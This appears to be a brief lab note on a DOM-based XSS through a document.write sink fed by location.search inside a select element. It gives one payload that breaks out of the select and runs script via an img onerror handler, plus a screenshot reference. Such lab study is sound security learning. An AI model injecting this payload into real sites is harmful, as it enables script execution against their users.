____

# DOM XSS in `document.write` sink using source `location.search` inside a select element

```html
"></select><img src=1 onerror=alert(1)>
```

![[Pasted image 20240804162601.png]]


